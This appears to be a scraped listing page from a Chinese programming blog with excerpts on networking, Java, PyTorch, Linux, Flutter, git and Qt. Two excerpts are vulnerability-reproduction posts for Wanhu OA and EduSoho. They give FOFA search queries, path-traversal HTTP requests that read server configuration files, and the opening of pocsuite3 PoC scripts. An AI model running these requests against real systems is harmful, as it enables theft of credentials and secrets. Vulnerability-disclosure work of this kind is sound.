			三层架构实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Convergence-S5700-1：
&lt;Huawei&gt;system-view [Huawei]sysname Convergence-S5700-1
[Convergence-S5700-1]interface Eth-Trunk 0
[Convergence-S5700-1-Eth-Trunk0]q
[Convergence-S5700-1]interface GigabitEthernet 0/0/23
[Convergence-S5700-1-GigabitEthernet0/0/23]eth-trunk 0
[Convergence-S5700-1-GigabitEthernet0/0/23]q
[Convergence-S5700-1]interface GigabitEthernet 0/0/24
[Convergence-S5700-1-GigabitEthernet0/0/24]eth-trunk 0
[Convergence-S5700-1-GigabitEthernet0/0/24]q
[Convergence-S5700-1]
Convergence-S5700-2：
&lt;Huawei&gt;system-view [Huawei]sysname Convergence-S5700-2
[Convergence-S5700-2]interface Eth-Trunk 0
[Convergence-S5700-2-Eth-Trunk0]q
[Convergence-S5700-2]interface GigabitEthernet 0/0/23
[Convergence-S5700-2-GigabitEthernet0/0/23]eth-trunk 0
[Convergence-S5700-2-GigabitEthernet0/0/23]q
[Convergence-S5700-2]interface GigabitEthernet 0/0/24
[Convergence-S5700-2-GigabitEthernet0/0/24]eth-trunk 0
[Convergence-S5700-2-GigabitEthernet0/0/24]q
[Convergence-S5700-2]
创建VLAN
Convergence-S5700-1：
[Convergence-S5700-1]vlan 2
[Convergence-S5700-1-vlan2]q
[Convergence-S5700-1]port-group group-member GigabitEthernet 0/0/2 to GigabitEthernet 0/0/3 Eth-Trunk 0
[Convergence-S5700-1-port-group]port link-type trunk [Convergence-S5700-1-port-group]port trunk allow-pass vlan 2
[Convergence-S5700-1-port-group]q
[Convergence-S5700-1]
Convergence-S5700-2：
[Convergence-S5700-2]vlan 2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b37406c9dd06e0c416b2ce148c624f84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d592d3734a68347df4512598f55d6d2e/" rel="bookmark">
			[java基础揉碎]do..while循环控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 基本语法: 说明: 1.先执行, 在判断, 也就是一定会执行一次 2.结尾有分号 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c5ac66f351354e29bbfdc0a61bbdd84/" rel="bookmark">
			处理多维特征的输入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 回顾多维向量的逻辑回归Mini-Batch 神经网络构建模型1. 数据准备2.定义模型3.构建损失函数和优化器4. 训练完整代码 练习 回顾 之前学习的分类和回归任务都是由x、y组成的数据集，但是我们的输入都是一维向量，那么针对多维向量的输入又该如何处理呢？
在数据集里面，我们把一行数据叫做一个样本（在数据库中叫做一个元组）
输入数据中的某一列叫做特征，比如说颜色、纹理、形状（在数据库中叫做属性/字段）
多维向量的逻辑回归 首先模型会发生变化：
Mini-Batch torch中的所有数据都是向量形式，可以把向量运算都转化为矩阵运算，利用并行计算提高计算能力。
假设输入数据为8维，输出为1维
请先尝试自己写一下这个逻辑回归模型的model代码！
如果线性层的输出是多维的呢？
上面的这个线性层已经把8维向量转化为了2维，但是我们最终结果是1维的.我们可以再后面再接一个线形层，将二维的转化为1维。
请利用下面这个代码写一个函数模型，完成线性模型的代码（降维到1维）
神经网络 多个神经元之间连接就可以实现维度的变换。
不仅可以实现降维，还可以升维。注意：提升维度可以提高模型的非线性表达能力，即模型的学习能力。但不是维度越高越好，维度过高可能会出现过拟合的现象。所有我们最终还是要注意模型的泛化能力，模型的层数、维度的设置需要合理。（可以利用超参数搜索的方式选择）
构造一个人工神经网络：
构造学习器进行数据预测的流程：
构建模型 1. 数据准备 # prepare dataset xy = np.loadtxt('diabetes.csv', delimiter=',', dtype=np.float32) #delimiter：分隔符，dtype：数据类型。pycharm中通常是float32 x_data = torch.from_numpy(xy[:, :-1]) # 第一个‘：’是指读取所有行，第二个‘：’是指从第一列开始，最后一列不要 y_data = torch.from_numpy(xy[:, [-1]]) # [-1] 最后一列，保证是矩阵形式 2.定义模型 class Model(torch.nn.Module): def __init__(self): super(Model, self).__init__() self.linear1 = torch.nn.Linear(8, 6) # 输入数据x的特征是8维，x有8个特征 self.linear2 = torch.nn.Linear(6, 4) self.linear3 = torch.nn.Linear(4, 1) self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c5ac66f351354e29bbfdc0a61bbdd84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9e84f90bd141ec5c322ae8ee4fab248/" rel="bookmark">
			Linux------进程状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在之前，我们学习了Linux为什么要有PCB-----冯诺依曼体系结构与操作系统，先描述，在组织。使用PCB将系统中的资源组织起来，方便操作系统和用户进行管理访问。还学习了Linux中进程的创建和fork操作，现在我们来讲一讲实际的PCB中的重要字段-------进程状态。
一、教材中的状态 在很多关于操作系统的教材，我们都可以看到下面这张图，我们能大概知道操作系统的状态有哪一些，做了什么事，但这样也确实会很抽象，如果可以结合具体的操作系统来谈进程状态，就能帮助我们更好理解。
其实这些进程状态，本质上就是PCB中的一个字段，或者说一个变量
#define NEW 1 // 新建 #define RUNNING 2 // 运行 #define BLOCK 3 // 阻塞 struct PCB { //其他变量 int status;//状态变量 }; 操作系统对pcb状态的操作就类似于 pcb-&gt;status = NEW 这种，后续就可以通过判断状态的情况，来将进程放入运行队列、阻塞队列或其他队列、链表中里。
创建状态和终止状态不必多说，就绪状态和执行状态可以统称为运行状态，阻塞状态分为一般阻塞和挂起阻塞。我们今天主要学习运行，阻塞，挂起这三个状态。
1.运行状态 在我们磁盘中写的程序，执行时会被加载到内存里，操作系统创建PCB将他描述组织起来，当该程序准备资源就绪后，就会被加载到运行队列，CPU会根据运行队列的排队情况，来处理运行中的进程。
我们引出结论：并不仅仅是纸面上的正在运行的进程状态才是运行状态，而是只要在运行队列里的进程，它的状态都是运行状态。 就是说进程已经准备好了，可以随时被CPU调度运行了。
2.阻塞状态 再学习阻塞状态之前，我们得先了解一个事情，我们的代码中，一定或多或少会访问系统的资源，比如磁盘、键盘、网卡等硬件设备。
我们可能会对文件进行写入，可能需要键盘读取数据，可能需要下载某些任务。
这里最好查看的例子就是通过scanf或者cin进行输入，本质上就是我们需要从键盘中读取数据，当我还没输入的时候，进程需要的资源还没就绪，进程代码也就无法向后运行。
比如下面这个代码
运行之后就会等待键盘输入，此时进程状态就是阻塞状态。
操作系统管理的本质是先描述，再组织，进程有PCB，底层硬件也有相应的设备结构体，存放着设备类型（是什么设备），设备状态（设备是否可以使用）等属性，同时还有一个进程的等待队列，进程排队着等待设备的就绪。此时，该等待队列里的进程状态都是阻塞。
我们知道，操作系统中有非常多的队列，如运行队列，设备等待队列等等。
进程状态变化的本质就是
1.更改pcb中 status整数变量
2.将PCB链入不同的队列中
比如，我需要从键盘中读取数据，目前用户还没输入，资源还没就绪，我将该进程的PCB链入键盘设备的等待队列里，同时将该PCB的status 改成阻塞状态。
等到用户输入结束，键盘资源就绪，再将该进程的PCB链入运行队列，同时将该PCB的status 改成运行状态，让CPU进行调度运行。这就是进程状态的变化。
这些所有的过程，都只和进程的PCB有关，和进程的的代码数据没有关系。
3.挂起状态 如果一个进程当前被阻塞了，注定这个进程在它所等待的资源没有就绪的时候，是无法调度的，如果此时，恰好操作系统内的内存资源已经严重不足了，该怎么办？
此时可以将进程将在内存中的进程数据置换到外设。直到该进程需要的资源就绪后，再将数据置换回来，这是针对所有阻塞进程
虽然这样会使得操作系统变慢，但是比起操作系统受不了要挂掉，慢一点是可以接受的，更重要的是让操作系统继续执行下去。
在我们装系统的时候，一般都有一个swap分区，操作系统内需要交换的数据会被交换到这里。
这种操作被称之为阻塞挂起，是阻塞的一种特殊情况。
二、linux中的进程状态 在linux 内核2.6版本中，我们看到进程的状态如下。
R（running）运行S（sleeping）睡眠D（disk sleep）磁盘睡眠T（stopped）暂停T（tracing stop）追踪暂停Z（zombie）僵尸X（dead）死亡 实际上的进程状态，与我们教材上的状态差别还挺大的，也不是教材中说错了，只是实际跟理论的区别。
1.运行状态 我们写一个死循环程序，如下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9e84f90bd141ec5c322ae8ee4fab248/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/171edb44cf6d051134db4382cac3ba4f/" rel="bookmark">
			flutter 搜索框实现，键盘搜索按钮，清空，防抖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import 'package:flutter/material.dart'; import 'package:flutter_screenutil/flutter_screenutil.dart'; import 'package:flutter_svg/svg.dart'; import 'package:sy_project/config/app_colors.dart'; import 'package:sy_project/core/assets.dart'; /// 搜索textview class CustomSearchBarInput extends StatefulWidget { // 回调函数 final Function(String) onSubmitted; final String hintLabel; const CustomSearchBarInput( {required this.hintLabel, required this.onSubmitted, super.key}); @override State&lt;CustomSearchBarInput&gt; createState() =&gt; _CustomSearchBarInputState(); } class _CustomSearchBarInputState extends State&lt;CustomSearchBarInput&gt; { // 焦点对象 // FocusNode _focusNode = FocusNode(); // 文本的值 String searchVal = ''; //用于清空输入框 TextEditingController _controller = TextEditingController(); @override void initState() { super.initState(); // 获取焦点 // WidgetsBinding.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/171edb44cf6d051134db4382cac3ba4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d965e5047a6fda9ee349027bfcd96809/" rel="bookmark">
			找工作/实习的流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af101473be50befa7db5476ae4e682fb/" rel="bookmark">
			Bug: git stash恢复误drop的提交
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Bug: git stash恢复误drop的提交 前几天在写ut时突然需要通过本地代码临时出一个包，但是本地ut又不想直接作为一个commit提交，所以为了省事就将ut的代码暂时stash起来。出完包后想apply stash，但是手误操作点成了drop stash，丢失了之前stash的代码。后来通过一顿猛操作摸索，成功恢复丢失的代码。
1 stash本地代码 这是我本地修改的代码，现在我通过goland将它stash起来
选中目录，右键 - git - Stash Changes
为此次stash添加一个备注信息：
create stash成功之后，我们开始的修改就都没了:
2 drop stash 本地出完包后，想要应用之前stash的代码：
选中对应目录 - Git - Unstash Changes 原本我们应该选中之前的stash点击右下角的apply stash，但是由于误操作，点成了右侧的drop，导致之前的stash丢失。
3 恢复之前drop的stash 3.1 通过命令找到之前的stash id 可视化展示git提交信息：git log --graph --decorate --pretty=oneline --abbrev-commit --all $(git fsck --no-reflogs | grep commit | cut -d’ ’ -f3)
命令行执行下面命令，图形化展示git提交信息：
git log --graph --decorate --pretty=oneline --abbrev-commit --all $(git fsck --no-reflogs | grep commit | cut -d' ' -f3) 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af101473be50befa7db5476ae4e682fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/674e79f4f995fc6578ca180e67d19df3/" rel="bookmark">
			VBA快速智能拆分日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实例需求：
A列为待处理数据，日期有多种格式 单个日期：6.16同月简写时间段：7.7-8，其含为7.7-7.8跨月时间段：5.29-6.2 现在需要将A列日期，按照如下规则筛选，并提取开始日期和结束日期，填写在B列和C列 时间段（包含起止日期）大于等于5天如果没有符合条件的时间段，B列和C列留空如果有多个符合条件的时间段，提取最后一个，例如A2单元格中，5.15-19和5.29-6.2都符合条件，那么从5.29-6.2中提取起止日期 示例代码如下。
Sub SplitDate() Dim arrDT, arrDate, i As Long, j As Long Dim dDate1 As Date, dDate2 As Date, iMth As Long Const DT_FORMAT = "yyyy-mm-dd" For i = 2 To Cells(Rows.Count, 1).End(xlUp).Row arrDT = Split(Cells(i, 1), ",") For j = UBound(arrDT) To 0 Step -1 arrDate = Split(Replace(Replace(arrDT(j), "-", "|"), ".", "-"), "|") If UBound(arrDate) &gt; 0 And IsDate(arrDate(0)) Then dDate1 = CDate(arrDate(0)) iMth = Month(dDate1) If InStr(arrDate(1), "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/674e79f4f995fc6578ca180e67d19df3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d88b12530e69103ed8cf49e15a8adbb6/" rel="bookmark">
			Spring第二讲
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="zhangsan" class="com.java1234.service.ZhangSan"&gt;&lt;/bean&gt; &lt;bean id="lisi" class="com.java1234.service.Lisi"&gt;&lt;/bean&gt; &lt;bean id="javaWork" class="com.java1234.service.JavaWork"&gt; &lt;!-- &lt;property name="tester" ref="zhangsan"&gt;&lt;/property&gt; --&gt; &lt;property name="tester" ref="lisi"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; package com.java1234.test; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; import com.java1234.service.JavaWork; import com.java1234.test.HelloWorld; public class Test2 { public static void main(String[] args) { ApplicationContext ac=new ClassPathXmlApplicationContext("beans.xml"); JavaWork javaWork=(JavaWork)ac.getBean("javaWork"); javaWork.doTest(); } } package com.java1234.test; import com.java1234.service.JavaWork; import com.java1234.service.Lisi; import com.java1234.service.ZhangSan; public class Test { public static void main(String[] args) { JavaWork javaWork=new JavaWork(); //	javaWork.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d88b12530e69103ed8cf49e15a8adbb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efd41c962d196e2b5fc1911063059b83/" rel="bookmark">
			SpringBoot注解@GetMapping处理Get请求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、如何从URL中获取参数二、获取多个参数三、用一个类接收多个参数四、疑问 一、如何从URL中获取参数 当你想从URL中获取名为courseId的参数时，可以使用@GetMapping("/course/{courseId}")和@GetMapping("/course")两种办法，主要体现在URL模式和如何获取参数上。
使用@GetMapping("/course/{courseId}"):
这种方式表示你正在定义一个REST风格的API，其中{courseId}是URL的一部分，通常被称为路径变量（path variable）。你可以通过在方法的参数中加上@PathVariable注解来获取这个路径变量。例如：@GetMapping("/course/{courseId}") public String getCourse(@PathVariable String courseId) { // 使用courseId } 这种方式适合于当courseId是必需的，并且每个课程的URL都是唯一的情况。 使用@GetMapping("/course"):
这种方式下，URL不直接包含courseId。相反，courseId可以作为请求参数（query parameter）来传递。你可以通过在方法的参数中加上@RequestParam注解来获取这个请求参数。例如：@GetMapping("/course") public String getCourse(@RequestParam String courseId) { // 使用courseId } 这种方式适合于当你想要让courseId作为一个可选参数或者你希望从一组标准的URL中筛选特定课程的情况。 二、获取多个参数 当URL中有多个参数时，@GetMapping("/course/{courseId}")和@GetMapping("/course")的使用方式和它们之间的区别仍然基于路径变量（Path Variable）和请求参数（Request Parameter）的概念。这两种方法可以根据参数的性质和用途灵活组合使用。
使用路径变量（Path Variables）:
当你使用@GetMapping("/course/{courseId}")并且URL中有多个参数时，这些参数通常是URL路径的一部分，并且每个参数都是资源定位的关键部分。例如，如果你有一个URL像这样：/course/{courseId}/module/{moduleId}，你可以这样使用：@GetMapping("/course/{courseId}/module/{moduleId}") public String getModule(@PathVariable String courseId, @PathVariable String moduleId) { // 使用courseId和moduleId } 在这个例子中，courseId和moduleId都是路径的一部分，用来定位特定的资源。 使用请求参数（Request Parameters）:
当你使用@GetMapping("/course")并且URL中有多个参数时，这些参数通常作为URL的查询字符串（query string）。例如，URL可能是这样的：/course?courseId=123&amp;moduleId=456，你可以这样使用：@GetMapping("/course") public String getCourse(@RequestParam String courseId, @RequestParam String moduleId) { // 使用courseId和moduleId } 在这个例子中，courseId和moduleId是作为查询字符串的一部分传递的，通常用于过滤、排序或其他非资源定位的操作。 三、用一个类接收多个参数 对于URL中包含多个请求参数（如 /course?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/efd41c962d196e2b5fc1911063059b83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44ce5b7e3a6cd20fe081cc42c33edd49/" rel="bookmark">
			QT实现USB摄像头接入显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、UVC协议简介
UVC全称是USB Video Class（USB视频类），是一种标准化的USB视频设备通信协议，它定义了摄像头与主机之间的数据传输协议和格式。
UVC协议的出现，解决了摄像头厂商之间互不兼容，以及摄像头应用开发与平台之间的散乱问题。
UVC标准是由USB-IF主导制定的，目前最新的版本是UVC 1.5，UVC的缺省设置类容易实现，不需要额外的驱动程序。
二、UVC协议不同版本对比
UVC协议的出现在2001年，目前已经发布了几个版本的标准协议：
| UVC版本 | 发布时间 | 支持最高分辨率 | 区别
UVC 1.0 | 2005年 | 800 x 600 | 第一个稳定版本
UVC 1.1 | 2008年 | 1920 x 1080 | 增加了更高分辨率的支持
UVC 1.5 | 2015年 | 4096 x 2304 | 增加了更高分辨率和HDR支持
从发布的时间、分辨率支持、HDR支持等角度来看，可以看出UVC协议在不断地演进和改进。
三.UVC协议的由来
UVC协议是早期微软(Microsoft)与另外几家主要设备厂商联合推出的为USB视频捕获设备定义的协议标准，目前是USBorg标准之一;USB摄像头即为标准的视频捕获设备。
四.支持的系统平台
Windows:自Windows XP SP2之后的版本都支持。
苹果Mac:Mac osX的10.4.3版本起加入UVC driver。
Linux:自Linux2.46之后增加了大量驱动到内核中，支持了UVC设备
PS3游戏主机: PlayStation 3在1.54版本开始支持UVC兼容
基于Linux内核的其它开源系统: 如派(Raspbian OS)乌图(Ubuntu)等，均使用Linux内核中的V4L2Videofor linux 2)来驱动USB摄像头。
五.QT实现接入USB摄像头
1.测试环境
摄像头：笔记本自带摄像头
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44ce5b7e3a6cd20fe081cc42c33edd49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8161f20077dc7a3b4475d98ff1108ab5/" rel="bookmark">
			C语言——操作符详解2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 0.过渡0.1 不创建临时变量，交换两数0.2 求整数转成二进制后1的总数 1.单目表达式2. 逗号表达式3. 下标访问[ ]、函数调用( )3.1 下标访问[ ]3.2 函数调用( ) 4. 结构体成员访问操作符4.1 结构体4.1.1 结构体的申明4.1.2 结构体变量的定义和初始化 4.2 结构体成员的访问4.2.1 结构体成员的直接访问4.2.2 结构体成员的间接访问 5. 操作符的属性：优先级、结合性 前半部分的操作符详解在这个链接——操作符详解1 0.过渡 在操作符1中我们最后讲了位操作符的概念这里我想举几个例子加深理解 0.1 不创建临时变量，交换两数 这是一道很变态的面试题首先我们可以看看下面两个等式： a ^ a =0a ^ 0 = a 接着我们来理解一下这道变态面试题的答案 #include &lt;stdio.h&gt; int main() { int a = 10; int b = 20; a = a^b; b = a^b;//根据上面的代码，这里的a^b=a^b^b=a^0=a,这里相当于把a给b a = a^b;//根据上面的代码，这里的a^b=a^a^b=0^b=b,这里相当于把b给a printf("a = %d b = %d\n", a, b); return 0; } 运行结果如下： 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8161f20077dc7a3b4475d98ff1108ab5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0909f727553a2d1412b95c03022d35dc/" rel="bookmark">
			从一个url输入到正常显示出来一个网页经历了哪些过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个是面试时经常问到的一个问题，主要是经历了以下几个过程：
DNS寻址建立TCP连接发起HTTP请求浏览器渲染 主要是以上的几个步骤了。
DNS寻址，之前在这篇文章介绍过，请参考：DNS寻址过程。
建立TCP连接要三次握手，断开连接要四次挥手。
发起HTTP请求把相关的html文档和相关资源例如css文件，图片从服务端给请求回来。
最后进行浏览器渲染，浏览器对请求回来的文件进行解析，解析成浏览器可以识别的格式，然后渲染成我们可以看到的网页。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36b5653c952740f7c1fce8c2cb8910e7/" rel="bookmark">
			漏洞复现-万户OA text2Html 任意文件读取（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 万户OA text2Html接口存在任意文件读取漏洞，可读取系统配置文件。
fofa语句 app="万户网络-ezOFFICE" poc加检测 POST /defaultroot/convertFile/text2Html.controller HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Upgrade-Insecure-Requests: 1 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded saveFileName=123456/../../../../WEB-INF/web.xml&amp;moduleName=html poc脚本 脚本使用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2024/1/27 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD, random_str class wanhu_text2html_fileread(POCBase): pocDesc = '''万户OA text2Html 任意文件读取漏洞''' author = '炼金术师诸葛亮' createDate = '2024-1-27' name = '万户OA text2Html 任意文件读取漏洞' #app="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36b5653c952740f7c1fce8c2cb8910e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec2e62faed757e429b74def6d7d0cf74/" rel="bookmark">
			Flutter 点击空白处关闭软键盘，点击非TextField 关闭软键盘的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：点击空白处(非控件上)关闭软键盘。 此方法有个问题，就是点击非空白区域，不会关闭软键盘，比如点击旁边的其他按钮，则软键盘还在。只适合点击空白处关闭软键盘
在 main.dart 入口 build 中增加
builder: (context, child) { //xxxxx 操作 return GestureDetector( behavior: HitTestBehavior.translucent, // 全局添加点击空白处隐藏键盘 onTap: () =&gt; FocusManager.instance.primaryFocus?.unfocus(), // onTap: () { // FocusScopeNode currentFocus = FocusScope.of(context); // if (!currentFocus.hasPrimaryFocus &amp;&amp; // currentFocus.focusedChild != null) { // FocusManager.instance.primaryFocus?.unfocus(); // } // }, child: child, ); }, 2. 点击非TextField 关闭软键盘 增加Listener 监听
此方法有个问题：点击所有地方都会先关闭软键盘。点击TextField 会先关闭软键盘，然后再重新弹出来。
builder: (context, child) { FlutterSmartDialog.init(); return Listener( onPointerDown: (_) { FocusScopeNode currentFocus = FocusScope.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec2e62faed757e429b74def6d7d0cf74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5d05175ea508e5c44b67bff91c5f264/" rel="bookmark">
			python222网站实战(SpringBoot&#43;SpringSecurity&#43;MybatisPlus&#43;thymeleaf&#43;layui)-友情链接管理实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		锋哥原创的Springboot+Layui python222网站实战：
python222网站实战课程视频教程（SpringBoot+Python爬虫实战） ( 火爆连载更新中... )_哔哩哔哩_bilibilipython222网站实战课程视频教程（SpringBoot+Python爬虫实战） ( 火爆连载更新中... )共计23条视频，包括：python222网站实战课程视频教程（SpringBoot+Python爬虫实战） ( 火爆连载更新中... )、第2讲 架构搭建实现、第3讲 页面系统属性动态化设计实现等，UP主更多精彩视频，请关注UP账号。https://www.bilibili.com/video/BV1yX4y1a7qM/
后端：
package com.python222.controller.admin; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.python222.entity.Link; import com.python222.entity.PageBean; import com.python222.service.LinkService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import java.util.HashMap; import java.util.Map; /** * 管理员-友情链接控制器 * @author Administrator * */ @RestController @RequestMapping(value = "/admin/link") public class LinkAdminController { @Autowired private LinkService linkService; /** * 根据条件分页查询友情链接 * @param page * @param limit * @return * @throws Exception */ @RequestMapping(value = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5d05175ea508e5c44b67bff91c5f264/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51d0e618d9cb6c0f3ab7215564096e75/" rel="bookmark">
			漏洞复现-EduSoho任意文件读取漏洞（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 教培系统classroom-course-statistics接口存在未授权任意文件读取漏洞，通过该漏洞攻击者可以读取到config/parameters.yml文件的内容，拿到该文件中保存的secret值以及数据库账号密码等敏感信息。拿到secret值后，攻击者可以结合symfony框架_fragment路由实现RCE。
fofa语句 title="Powered By EduSoho" || body="Powered by &lt;a href=\"http://www.edusoho.com/\" target=\"_blank\"&gt;EduSoho" || (body="Powered By EduSoho" &amp;&amp; body="var app") poc加检测 GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 poc脚本 脚本使用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2024/1/27 # @Author: 炼金术师诸葛亮 from pocsuite3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51d0e618d9cb6c0f3ab7215564096e75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c473d6adcaa2f482fa5625df9aedecd8/" rel="bookmark">
			Qt环境搭建及基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Qt背景及环境搭建
​编辑
基础语法 数据类型
内联函数 inline
Lambda表达式
通过函数调用中加lambda匿名函数
参数捕获
Lambda和内联函数区别​编辑
函数指针
Lambda匿名函数小案例
通过结构体初始化，和指针初始化结构体
c++类的引入
：：是命名空间
在一个类中使用另一个类 组合
银行取钱小案例
指针和引用
函数重载和运算符重载
列表初始化的构造函数
this关键字
delect数组和指针
构造函数
什么是析构函数
静态变量
继承 分文件编程
权限对继承的影响
虚函数 多重继承
菱形继承 ---- 虚继承解决
虚继承和构造函数继承
继承相关概念表​编辑
多态
如何实现多态
为什么使用多态
抽象类
Qt背景及环境搭建 Qt 是一个跨平台的应用程序和用户界面框架，用于开发图形用户界面（GUI）应用程序以及命令行工具。它最初由挪威的 Trolltech （奇趣科技）公司开发，现在由 Qt Company 维护，2020年12月8日发布QT6。Qt 使用 C++ 语言编写，支持多种编程语言通过绑定进行使用。
对于许多开发者和小型企业来说，Qt 的开源版提供了一个强大且灵活的开发框架，而对于需要额外支持和专有功能的大型企业或具有特定需求的项目，商业版则提供了所需的服务和资源。
Qt 商业版
商业版提供专有许可，需要购买许可证来使用。这适用于希望在不共享源代码的情况下开发商业软件的公司和开发人员
QT免费开源版
